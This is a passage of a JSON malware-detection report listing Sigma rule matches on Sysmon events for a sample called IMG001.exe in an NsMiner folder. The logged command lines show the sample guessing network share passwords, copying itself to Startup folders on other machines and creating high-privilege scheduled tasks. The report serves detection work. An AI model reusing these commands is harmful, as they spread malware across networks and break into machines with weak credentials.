\"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-7A06-000000003B00}; ProcessId=7932; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C083-6560-4506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8124; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\192.168.2.90\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\192.168.2.90\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839562; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "e36b579d4bc4ef49ede1d82dd08ec1cba660d105c6f037d12ecf79b434617e88",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Schtasks Schedule Type With High Privileges",
                                                                       "rule_description":  "Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-2F06-000000003B00}; ProcessId=3540; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2906-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2172; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-3106-000000003B00}; ProcessId=6736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2B06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7292; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-6006-000000003B00}; ProcessId=8040; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C088-6560-5806-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7856; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-6206-000000003B00}; ProcessId=7924; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C088-6560-5A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7804; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08F-6560-9606-000000003B00}; ProcessId=1880; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08E-6560-8F06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4080; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839567; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "f09d5248ed8fc1a93251158bfda71f8144ccaf37fa922416ccd897498bff7c55",
                                                                       "rule_source":  "SOC Prime Threat Detection Marketplace",
                                                                       "rule_title":  "Suspicious Process Creation",
                                                                       "rule_description":  "Detects suspicious process starts on Windows systems based on keywords",
                                                                       "rule_author":  "Florian Roth",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-2F06-000000003B00}; ProcessId=3540; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2906-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=2172; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-3106-000000003B00}; ProcessId=6736; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2B06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7292; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /RU \"SYSTEM\" /SC ONLOGON /F /V1 /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-6006-000000003B00}; ProcessId=8040; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C088-6560-5806-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7856; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=schtasks  /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn \"UAC\" /SC ONLOGON /F /RL HIGHEST /TR \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\"; UtcTime=1700839560; RuleName=-}"
                                                                                             },
